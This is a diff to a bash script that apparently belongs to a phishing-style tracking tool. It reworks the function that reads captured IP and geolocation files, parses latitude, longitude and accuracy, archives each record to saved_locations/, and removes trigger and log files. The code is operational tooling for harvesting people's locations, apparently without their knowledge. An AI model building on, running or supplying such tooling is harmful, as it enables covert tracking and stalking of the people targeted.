@@ -89,20 +89,10 @@ cat ip.txt >> saved.ip.txt
 }
 
 catch_location() {
-  # First check for the current_location.txt file which is always created
-  if [[ -e "current_location.txt" ]]; then
-    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
-    # Filter out unwanted messages before displaying
-    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
-    printf "\n"
+  # Process all pending location files
+  for location_file in location_*.txt; do
+    [ -e "$location_file" ] || continue
     
-    # Move it to a backup to avoid duplicate display
-    mv current_location.txt current_location.bak
-  fi
-
-  # Then check for any location_* files
-  if [[ -e "location_"* ]]; then
-    location_file=$(ls location_* | head -n 1)
     lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
@@ -121,11 +111,12 @@ catch_location() {
     
     mv "$location_file" saved_locations/
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
-  else
-    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
-    
-    # Don't display any debug logs to avoid showing unwanted messages
-  fi
+  done
+
+  # Clean up triggers and temporary files
+  rm -f current_location.txt LocationLog.log LocationError.log 2>/dev/null
+  # Keep backup of the last one for reference if needed
+  [ -f current_location.txt ] && mv current_location.txt current_location.bak 2>/dev/null
 }
 
 checkfound() {
@@ -147,18 +138,11 @@ fi
 
 sleep 0.5
 
-# Check for current_location.txt first (our new immediate indicator)
-if [[ -e "current_location.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
-catch_location
-fi
-
-# Also check for LocationLog.log (the original indicator)
-if [[ -e "LocationLog.log" ]]; then
+# Combined check for any location indicator
+if [[ -e "LocationLog.log" || -e "current_location.txt" || -n $(ls location_*.txt 2>/dev/null) ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 # Don't display the raw log content, just process it
 catch_location
-rm -rf LocationLog.log
 fi
 
 # Don't display error logs to avoid showing unwanted messages
